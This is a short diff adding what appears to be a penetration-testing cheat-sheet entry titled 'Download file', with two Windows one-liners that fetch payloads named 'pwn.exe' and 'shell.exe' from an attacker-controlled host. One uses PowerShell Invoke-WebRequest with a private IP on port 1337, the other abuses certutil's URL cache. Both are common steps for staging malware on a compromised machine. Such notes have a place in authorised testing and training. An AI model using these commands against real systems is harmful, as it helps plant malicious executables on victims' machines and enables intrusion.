@@ -1,0 +1,6 @@
+Download file 
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.2.70.164:1337/pwn.exe' -OutFile 'C:\Windows\Temp\pwn.exe'"
+certutil -urlcache -f http://<ip>/shell.exe shell.exe
+
+
